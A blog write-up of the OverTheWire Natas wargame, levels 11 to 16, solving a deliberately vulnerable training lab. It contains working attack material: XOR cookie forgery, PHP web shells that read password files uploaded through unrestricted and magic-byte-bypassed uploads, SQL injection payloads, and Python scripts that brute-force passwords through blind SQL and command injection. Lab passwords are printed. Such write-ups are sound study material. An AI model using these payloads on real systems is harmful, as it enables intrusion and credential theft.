---
layout: single
title: "OverTheWire: 'Natas' Solutions 11-16"
header:
  teaser: oth.png
  overlay_image: ZenBGG.png
  caption: "[__OverTheWire__](http://overthewire.org/wargames/)"
related: true
comments: true
---

Welcome back! This post is the continuation of the __Natas__ wargame from [OverTheWire](http://overthewire.org/wargames/natas/).

If you haven't already read my post from Solution 1-10, then I highly suggest you do so before continuing on to the higher end levels, as the lower levels will provide you the basics of web hacking. You can read that post [here](https://jhalon.github.io/over-the-wire-natas1/)!

So, without further adieu, let us begin!

### Level 11:
<a href="/images/natas11.PNG"><img src="/images/natas11.PNG"></a>

So is seems like the cookies are protected with a XOR Encryption... interesting! Let's go ahead and grab the XOR Encrypted cookie that the site is using. Fire up Burp, intercept the packet, and you should get the following: 

<a href="/images/natas11-2.PNG"><img src="/images/natas11-2.PNG"></a>

`Set Cookie: "data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"`

Now let's go ahead and see what the source code holds for us.

```php
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```

If you know what a [XOR Cipher](https://en.wikipedia.org/wiki/XOR_cipher) is then you would remember that _A_ __XOR__ _B_ = _C_.

In this case, it would be: _Original_Data_ __XOR__ _KEY_ = _Encrypted_Data_.

Thus to get the __Key__ we do the following: _Original_Data_ __XOR__ _Encrypted_Data_ = _KEY_, since we already are provided with the __Original_Data__ and __Encrypted_Data__.

Sounds easy enough, right? Good! Let's fire up PHP and write the following script to reverse engineer the key.

```php
<?
function xor_encrypt($text) {
    $key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
    $outText = '';
 
    for($i=0;$i<strlen($text);$i++) {
       $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
 
    return $outText;
}
 
$data = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
print xor_encrypt(json_encode($data));
?>
```

And we will get the __Key__ Output of `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`. Okay, great. So let's go back and edit our code, and replace the `$key` with our newly found key, and also edit the __showpassword__ to __yes__.

```php
<?
function xor_encrypt($text) {
    $key = 'qw8J';
    $outText = '';
 
    for($i=0;$i<strlen($text);$i++) {
       $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
 
    return $outText;
}
 
$data = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
print base64_encode(xor_encrypt(json_encode($data)));
?>
```

Once we run the new PHP script we should get an output of our cookie: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`.

With this new cookie, let's go back to Burp and submit it to the page. If done correctly, we should get the password `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`. Now we can move on to level 12!

### Level 12:
<a href="/images/natas12.PNG"><img src="/images/natas12.PNG"></a>

It seems like for this level we are supposed to upload a JPEG File. Let's see what the source code does before we decide on how to exploit this.

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?> 
```

It seems as if the code is taking the uploaded file, creating a random name and path, and adding a preset extension - which we can assume is __.jpeg__.

The first thing that I can think of, off the top of my head is an [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload). So let's go ahead and test for this vulnerability. We can begin by creating a simple PHP Shell that will echo back the contents of __/etc/natas_webpass/natas13__.

```php
<?
$output = shell_exec('cat /etc/natas_webpass/natas13');
echo "<pre>$output</pre>";
?>
```

Once done, save it as __shell.php__. Go back to the website, click __Browse__ and select our shell. BUT! Before you click __Upload__, fire up Burp and set up the Burp Proxy to intercept packets. Once done, click __Upload__.

Looking at the Burp Intercept, towards the bottom of the page, we can see the following lines:

```js
Content-Disposition: form-data; name="filename"

zvot8u94ri.jpg
-----------------------------15512856191759264131314404296
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: application/x-php

<?
$output = shell_exec('cat /etc/natas_webpass/natas13');
echo "<pre>$output<pre>";
?>

-----------------------------15512856191759264131314404296--
```

We can see that our filename is being changed to __.jpg__ and being renamed. So let's edit that back to __shell.php__, and forward the packet. You should see something along the lines of "__The file upload/etgklnh5pq.php has been uploaded__" come up.

<a href="/images/natas12-3.PNG"><img src="/images/natas12-3.PNG"></a>

Go ahead and click the __upload/yh33kxvyt8.php__ link, and we should get the password `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.

Good job! Not as hard as 11... let's move on to level 13!

### Level 13:
<a href="/images/natas13.PNG"><img src="/images/natas13.PNG"></a>

This level seems to be the same as 12. The only catch is that the upload accepts image files only. Let's see source code.

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?> 
```

The source code is similar to 12, but it has some extra addition to it. If you look closely to the IF/ELSE statements, we can see that [exif_imagetype](http://php.net/manual/en/function.exif-imagetype.php) is being used. What this does is that it reads the first bytes of an image and checks its signature.

Okay, I'm sure we can exploit this! Let's go ahead and edit __shell.php__ that we used in level 12.This time it has to be pulling the password from Natas14. Also we have to add BMP to the start of the file - this will allow exif_imagetype to read the file as a [Bitmap File Image](https://en.wikipedia.org/wiki/BMP_file_format), and will bypass the upload check, allowing our shell.

```php
BMP<?
$output = shell_exec('cat /etc/natas_webpass/natas14');
echo "<pre>$output</pre>";
?>
```

We will be doing a repeat of 12, so click __Browse__ and look for __shell.php__, open it, fire up Burp, start up the proxy, and __Upload__ the file!

In Burp's Intercept we should see something along the following lines:

```js
Content-Disposition: form-data; name="filename"

3hwxwqemk3.jpg
-----------------------------1625648362953610391147035725
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: application/x-php

<?
$output = shell_exec('cat /etc/natas_webpass/natas14');
echo "<pre>$output</pre>";
?>

-----------------------------1625648362953610391147035725--
```

Let's change the name __3hwxwqemk3.jpg__ to __shell.php__, and forward the packet. You should now see something along the lines of "__The file upload/w0yzhafetj.php has been uploaded__". 

<a href="/images/natas13-2.PNG"><img src="/images/natas13-2.PNG"></a>

Let's go ahead and click the __upload/4mi1msvukh.php__ link. 

If done correctly we should get the password `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`.

Congrats! It was simple enough! I suggest you go read more about [Unrestricted File Uploads](https://www.owasp.org/index.php/Unrestricted_File_Upload) from __OWASP__ as they are an amazing source to learning Web Hacking! We're done here... so moving on to level 14!

### Level 14:
<a href="/images/natas14.PNG"><img src="/images/natas14.PNG"></a>

Okay, for this level is seems we have to enter a username and password. Let's read the source code and see if we can't find any clues to what this app does.

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?> 
```

Looking at the PHP script we see that __MySql__ is being used, so we can assume that this login page is vulnerable to a [SQL Injection](https://www.owasp.org/index.php/SQL_Injection) Attack.

Let's look at the query that is being used in the PHP Script.

```php
SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"
```

This can be translated as:

```sql
SELECT * from users where username = "username" and password = "password"
```

Looking at the code, it doesn’t seem to be preventing us from entering any "wrong" input. So for the username and password field, we can enter __"="__. The result is the following SQL Query:

```sql
SELECT * from users where username = ""="" and password = ""=""
```
The SQL query is thus valid, and will return all rows from the table Users, since WHERE ""="" is always true.

If done successfully, you should get the password `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J` and we can move on to level 15!

### Level 15:
<a href="/images/natas15.PNG"><img src="/images/natas15.PNG"></a>

My god... this level took me way longer then I am willing to admit! Having only to work with a username I knew we would probably be doing a SQL Injection. At the end, I figured out that this is a [Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection).

Before we dig deeper let's look at the Source Code.

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?> 
```

Looking at the query in PHP we can translate it to:

```sql
SELECT * from users where username = "username";
```

Now, I for one always laugh when I see quotes in inputs on web applications that don't do proper input validation. This just speaks "EXPLOIT HERE”. As I stated before this is a Blind SQL Injection, meaning that we are "blind" to generic errors and can only tell what the application is doing by using __true__ or __false__ statements. 

Looking into the code we can also see that the comment states that a table called "__users__" was created, and contains two columns - "__username__" and "__password__"... at least we now know we can try to get the password. 

So, we need to get the password for natas16, and to do that we will have to brute force the password. In general, this will be similar to the brute forcing we did in Bandit, but a little more complex. I will be creating the script to brute force the password using [Python](https://www.python.org/), so I suggest brushing up on it before continuing, or use another language like Ruby, JavaScript, C, etc.

First, let's try and create a SQL Query that will allow us to see what letters are in the __password__ field for natas16. We will try to inject __natas16" and password LIKE BINARY "a%__, and it will bode us this query.

```sql
SELECT * from users where username = "natas16" and password LIKE BINARY "a%"
```

What this query does is basically pull the username __natas16__ and check to see if a certain character is used in their associated password field. We use the [LIKE](http://www.w3schools.com/sql/sql_like.asp) statement to search for specified letters or patterns, and the MySQL Operator [BINARY](http://dev.mysql.com/doc/refman/5.5/en/cast-functions.html#operator_binary) to compare case sensitive letters.

When we run this query, if the character we chose are in the password, the page will return __The user exists__, if the character isn’t in the password, then we will get __The user doesn’t exist__. 

So let's go ahead and write a python script to check for password characters, and then try to brute force the password.

```python
#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'
trueStr = 'This user exists.'

r = requests.get(target, verify=False)

for x in chars:
	r = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+x+'%" "')
	if r.content.find(trueStr) != -1:
		exist += x
		print 'Using: ' + exist

print 'All characters used. Starting brute force... Grab a coffee, might take a while!'

for i in range(32):
	for c in exist:
		r = requests.get(target+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
		if r.content.find(trueStr) != -1:
			password += c
			print 'Password: ' + password + '*' * int(32 - len(password))
			break

print 'Completed!'
```
Once done, save this as __brute.py__ or anything you like, and let's give the script execute permissions, and then run it!

```console
root@kali:~# chmod +x brute.py
root@kali:~# ./brute.py
Using: 0
Using: 03
Using: 035
Using: 0356
Using: 03569
Using: 03569a
Using: 03569ac
Using: 03569ace
Using: 03569aceh
Using: 03569acehi
Using: 03569acehij
Using: 03569acehijm
Using: 03569acehijmn
Using: 03569acehijmnp
Using: 03569acehijmnpq
Using: 03569acehijmnpqt
Using: 03569acehijmnpqtw
Using: 03569acehijmnpqtwB
Using: 03569acehijmnpqtwBE
Using: 03569acehijmnpqtwBEH
Using: 03569acehijmnpqtwBEHI
Using: 03569acehijmnpqtwBEHIN
Using: 03569acehijmnpqtwBEHINO
Using: 03569acehijmnpqtwBEHINOR
Using: 03569acehijmnpqtwBEHINORW
All characters used. Starting brute force... Grab a coffee, might take a while!
Password: W*******************************
Password: Wa******************************
Password: WaI*****************************
Password: WaIH****************************
Password: WaIHE***************************
Password: WaIHEa**************************
Password: WaIHEac*************************
Password: WaIHEacj************************
Password: WaIHEacj6***********************
Password: WaIHEacj63**********************
Password: WaIHEacj63w*********************
Password: WaIHEacj63wn********************
Password: WaIHEacj63wnN*******************
Password: WaIHEacj63wnNI******************
Password: WaIHEacj63wnNIB*****************
Password: WaIHEacj63wnNIBR****************
Password: WaIHEacj63wnNIBRO***************
Password: WaIHEacj63wnNIBROH**************
Password: WaIHEacj63wnNIBROHe*************
Password: WaIHEacj63wnNIBROHeq************
Password: WaIHEacj63wnNIBROHeqi***********
Password: WaIHEacj63wnNIBROHeqi3**********
Password: WaIHEacj63wnNIBROHeqi3p*********
Password: WaIHEacj63wnNIBROHeqi3p9********
Password: WaIHEacj63wnNIBROHeqi3p9t*******
Password: WaIHEacj63wnNIBROHeqi3p9t0******
Password: WaIHEacj63wnNIBROHeqi3p9t0m*****
Password: WaIHEacj63wnNIBROHeqi3p9t0m5****
Password: WaIHEacj63wnNIBROHeqi3p9t0m5n***
Password: WaIHEacj63wnNIBROHeqi3p9t0m5nh**
Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm*
Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
Completed!
```

Oh yah! We got the password for natas16! We are one step closer to becoming 1337 hackerz! On to level 16!

### Level 16:
<a href="/images/natas16.PNG"><img src="/images/natas16.PNG"></a>

This level is actually similar to level 9 and 10 of natas. Though this time, there is more filtering being done, so we might have a tough time to inject code. Let's check the source code and see what we have.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Great... this might be a little though. They aren't only filtering characters needed to inject a command, they are also [escaping](http://www.hackingwithphp.com/2/6/2/escape-sequences) quote characters for __$key__. This will turn any of our input into a string.

But I have noticed that they aren't filtering the __$__ and __( )__ characters. So we might be able to inject another command into the string using [command substitution](http://wiki.bash-hackers.org/syntax/expansion/cmdsubst). 

I attempted to inject __$(grep a /etc/natas_webpass/natas17)__, I noticed that all of the dictionary words were returned. The command that I ran, looked something like this within the php code.

`passthru("grep -i \"$(grep a /etc/natas_webpass/natas17)\" dictionary.txt");`

Because all words were returned, I knew the command I injected - to __grep a__ in natas17 - was false. When I tried injecting __$(grep A /etc/natas_webpass/natas17)__, nothing was returned. This made me believe that if nothing was returned, then my command was valid and the letter A, existed in natas17's password.

So what we have to do from here is similar to 16. We need to take our python code, edit it, and try to brute force the password. I used the word __Fridays__ at the end of my command - __$(grep a /etc/natas_webpass/natas17)Fridays__ - so in case the command failed, __Fridays__ would return in the output and my script could pick up on that as __False__.

So let's go head and edit our __brute.py__ script like so:

```python
#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh*@natas16.natas.labs.overthewire.org/'
trueStr = 'Output:\n<pre>\n</pre>'

for x in chars:
        r = requests.get(target+'?needle=$(grep '+x+' /etc/natas_webpass/natas17)Fridays')
        if r.content.find(trueStr) != -1:
                exist += x
                print 'Using: ' + exist

print 'All characters used. Starting brute force... Grab a coffee, might take a while!'

for i in range(32):
        for c in exist:
                r = requests.get(target+'?needle=$(grep ^'+password+c+' /etc/natas_webpass/natas17)Fridays')
                if r.content.find(trueStr) != -1:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break
                        
print 'Completed!'
```

Once done, let's go ahead and run it!

```console
root@kali:~# chmod +x brute.py
root@kali:~# ./brute.py
Used chars: 0
Used chars: 03
Used chars: 035
Used chars: 0357
Used chars: 03578
Used chars: 035789
Used chars: 035789b
Used chars: 035789bc
Used chars: 035789bcd
Used chars: 035789bcdg
Used chars: 035789bcdgh
Used chars: 035789bcdghk
Used chars: 035789bcdghkm
Used chars: 035789bcdghkmn
Used chars: 035789bcdghkmnq
Used chars: 035789bcdghkmnqr
Used chars: 035789bcdghkmnqrs
Used chars: 035789bcdghkmnqrsw
Used chars: 035789bcdghkmnqrswA
Used chars: 035789bcdghkmnqrswAG
Used chars: 035789bcdghkmnqrswAGH
Used chars: 035789bcdghkmnqrswAGHN
Used chars: 035789bcdghkmnqrswAGHNP
Used chars: 035789bcdghkmnqrswAGHNPQ
Used chars: 035789bcdghkmnqrswAGHNPQS
Used chars: 035789bcdghkmnqrswAGHNPQSW
All characters used. Starting brute force... Grab a coffee, might take a while!
Password: 8*******************************
Password: 8P******************************
Password: 8Ps*****************************
Password: 8Ps3****************************
Password: 8Ps3H***************************
Password: 8Ps3H0**************************
Password: 8Ps3H0G*************************
Password: 8Ps3H0GW************************
Password: 8Ps3H0GWb***********************
Password: 8Ps3H0GWbn**********************
Password: 8Ps3H0GWbn5*********************
Password: 8Ps3H0GWbn5r********************
Password: 8Ps3H0GWbn5rd*******************
Password: 8Ps3H0GWbn5rd9******************
Password: 8Ps3H0GWbn5rd9S*****************
Password: 8Ps3H0GWbn5rd9S7****************
Password: 8Ps3H0GWbn5rd9S7G***************
Password: 8Ps3H0GWbn5rd9S7Gm**************
Password: 8Ps3H0GWbn5rd9S7GmA*************
Password: 8Ps3H0GWbn5rd9S7GmAd************
Password: 8Ps3H0GWbn5rd9S7GmAdg***********
Password: 8Ps3H0GWbn5rd9S7GmAdgQ**********
Password: 8Ps3H0GWbn5rd9S7GmAdgQN*********
Password: 8Ps3H0GWbn5rd9S7GmAdgQNd********
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdk*******
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkh******
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP*****
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk****
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq***
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9**
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c*
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
Completed!
```

And there we have it folks! We are done with level 16, and can move on to level 17!

That's all for now! Join me next time for a continution on Natas! Also expect futureRaspberry Pi Projects, Web Camera Hacking PoC, and more!
